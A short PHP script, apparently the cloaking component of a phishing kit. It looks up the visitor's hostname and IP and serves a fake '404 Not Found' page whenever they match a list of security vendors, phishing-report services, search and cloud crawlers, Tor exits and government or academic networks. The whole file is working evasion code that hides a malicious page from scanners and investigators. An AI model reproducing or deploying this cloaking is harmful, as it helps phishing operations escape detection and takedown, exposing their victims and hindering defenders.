<?php
$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$blocked_words = array("barracuda","microsoft","digitalocean","above","google","kaspersky","avast","aruba","softlayer","amazonaws","cyveillance","phishtank","dreamhost","netpilot","calyxinstitute","tor-exit","thor","tor","amazon","trendmicro","cisco","proxy","msn","messagelabs","lgfl","razorblue","essensys","tkmaxx","satcomgroup","aurora","exit","leblibrary","vive","webdefence","forcepoint","shef","example","scaleway","choopa","voxility","mail","remote","gov","redstone","nhs","yahoo","crawl","ac.uk","scansafe");
foreach($blocked_words as $word) {
    if (substr_count($hostname, $word) > 0) {
		header("HTTP/1.0 404 Not Found");
        die("<h1>404 Not Found</h1>The page that you have requested could not be found.");

    }  
}
$bannedIP = array("^13.85.*.*", "^195.77.*.*", "^104.42.*.*", "^185.217.*.*", "^216.80.*.*", "^88.98.*.*", "^52.171.*.*", "^37.152.157.*", "^185.47.214.*", "^185.89.217.*", "^185.218.33.*", "^146.112.253.*", "^167.220.*.*", "^80.254.154.*", "^65.152.*.*", "^40.107.*.*", "^66.102.*.*", "^13.92.*.*", "^52.168.*.*", "^199.19.*.*", "^217.146.*.*", "^162.243.*.*", "^40.107.*.*", "^185.20.*.*", "^72.21.217.*", "^38.100.*.*", "^107.170.*.*", "^149.20.*.*", "^38.105.*.*", "^74.125.*.*",  "^66.150.14.*", "^54.176.*.*", "^38.100.*.*", "^184.173.*.*", "^66.249.*.*", "^128.242.*.*", "^72.14.192.*", "^208.65.144.*", "^74.125.*.*", "^209.85.128.*", "^216.239.32.*", "^74.125.*.*", "^207.126.144.*", "^173.194.*.*", "^64.233.160.*", "^72.14.192.*", "^66.102.*.*", "^64.18.*.*", "^194.52.68.*", "^194.72.238.*", "^62.116.207.*", "^212.50.193.*", "^69.65.*.*", "^50.7.*.*", "^131.212.*.*", "^46.116.*.* ", "^62.90.*.*", "^89.138.*.*", "^82.166.*.*", "^85.64.*.*", "^85.250.*.*", "^89.138.*.*", "^93.172.*.*", "^109.186.*.*", "^194.90.*.*", "^212.29.192.*", "^212.29.224.*", "^212.143.*.*", "^212.150.*.*", "^212.235.*.*", "^217.132.*.*", "^50.97.*.*", "^217.132.*.*", "^209.85.*.*", "^66.205.64.*", "^204.14.48.*", "^64.27.2.*", "^67.15.*.*", "^202.108.252.*", "^193.47.80.*", "^64.62.136.*", "^66.221.*.*", "^64.62.175.*", "^198.54.*.*", "^192.115.134.*", "^216.252.167.*", "^193.253.199.*", "^69.61.12.*", "^64.37.103.*", "^38.144.36.*", "^64.124.14.*", "^206.28.72.*", "^209.73.228.*", "^158.108.*.*", "^168.188.*.*", "^66.207.120.*", "^167.24.*.*", "^192.118.48.*", "^67.209.128.*", "^12.148.209.*", "^12.148.196.*", "^193.220.178.*", "68.65.53.71", "^198.25.*.*", "^64.106.213.*", "^148.252.128.*", "109.201.133.100", "93.115.95.201", "171.33.195.29", "5.150.100.156", "^148.252.129.*", "185.13.245.242", "151.237.234.192", "109.68.13.90", "217.23.229.100", "194.203.125.13", "160.9.2.118", "217.33.47.82", "173.14.173.227", "176.126.252.12", "185.109.40.75", "85.115.54.202", "143.167.211.163", "185.189.14.61", "104.238.169.60", "37.59.112.7", "^5.62.*.*", "176.62.173.133", "162.243.187.126", "62.149.225.67", "^46.101.*.*", "13.112.153.43", "196.54.55.44", "212.81.199.159", "35.160.177.199", "35.157.68.120", "177.154.139.197", "91.103.66.203", "195.144.11.46", "104.237.90.41", "192.162.26.58", "173.52.78.112", "79.79.150.30", "196.54.55.31", "107.188.234.212", "75.98.158.218", "162.253.236.94", "193.17.195.102", "213.233.85.107", "193.17.195.110", "109.166.130.251", "109.166.135.239", "213.233.84.219", "213.233.85.107", "93.122.250.55", "84.232.228.233", "93.122.249.163", "93.122.165.106", "109.166.138.112", "213.233.84.239", "212.64.228.100", "79.182.96.177", "46.97.152.52", "213.233.85.148", "104.132.20.92", "62.219.3.47", "89.38.111.109", "93.122.248.248", "93.122.250.55", "109.166.132.80", "194.152.42.120", "82.76.220.243", "207.244.70.35", "104.132.20.65", "5.2.252.8", "89.136.199.19", "85.255.232.140", "51.52.30.2", "84.93.110.193", "77.97.236.115", "84.93.110.193", "81.132.66.12", "2.221.74.193", "90.194.67.23", "109.155.23.204", "86.173.154.91", "213.1.213.242", "38.80.27.77", "^40.107.*.*", "^104.47.*.*", "4.53.111.76", "98.191.243.50");
if(in_array($_SERVER['REMOTE_ADDR'],$bannedIP)) {
     
        header("HTTP/1.0 404 Not Found");
        die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
          }
?>